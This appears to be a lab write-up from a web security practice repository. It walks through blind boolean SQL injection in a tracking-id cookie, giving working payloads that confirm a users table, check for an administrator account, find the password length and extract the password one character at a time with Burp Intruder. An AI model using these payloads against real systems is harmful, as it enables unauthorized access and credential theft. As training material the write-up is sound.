Look for tracking id and welcome back response
Url encode this 

We get welcome back
```
' and 1=1--
``` 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bec493f3-8e02-4d1e-8bc5-aeae8dc622c4)


We don't get welcome back
```
' and 1=0--
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c5dbae55-eac7-411e-a0ac-f28b68b0bca4)



Finding out if the users table exist. The value x is a arbitray it can be any letter 
```
and (select 'x' from users LIMIT 1)='x'--'
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3dec92fc-1e1b-4a3a-9baa-8227d64ed933)

Confirm that username administrator exists in users table since we got another welcome back
Will output welcome back if username administrator exist
```
and (select username from users where username='administrator')='administrator'--'
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1d9cd0aa-727d-440a-b5be-0baa431b85c4)


Trying with user that does not exist
we did not get welcome back
```
and (select username from users where username='viet')='viet'--'
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8e71df5d-3892-4eff-8504-93e4f83c1f87)



enumerate password if it exist
ask if each character exist
does the password start with a,b,c....ETC

First we have to get the length of the password 
Query ask if password is bigger than 1 
```
and (select username from users where username='administrator' and length(password)>1) ='administrator'--'
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/0189c16d-b320-40bc-9845-8f7fdcb701ca)


Using intruder and payload set number on burpsuite we can increment the length of the password 50 
```
and (select username from users where username='administrator' and length(password)>1) ='administrator'--'
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/da89846c-ec96-4a04-ad0f-34cef2220b1d)


![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c92a6db8-306c-40f9-a058-3e6bab557d9f)

Welcome back/length stopped at 20  so the characters of the password is 20
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9aabc4de-f597-4fd5-ba27-3bbb35ed86c0)


Enumerate password from 1 character to 20 character
```
and (select substring(password,1,1) from users where username='administrator')='a'--'
and (select substring(password,1,1) from users where username='administrator')='b'--'
etc
```
```
a no welcome back
b no wlecome back
``` 

We load onto intruder and select cluster bomb and select the following payload for our parameter 
Number (our length)
Bruteforcer (character to use for each length)
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/965339fa-e96e-4214-bc0f-a219ea9c710d)

our password is in the following. Where payload1 is the placement and payload2 is the character for that placement
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/93764f49-7af6-4305-8361-7eb9444df36d)

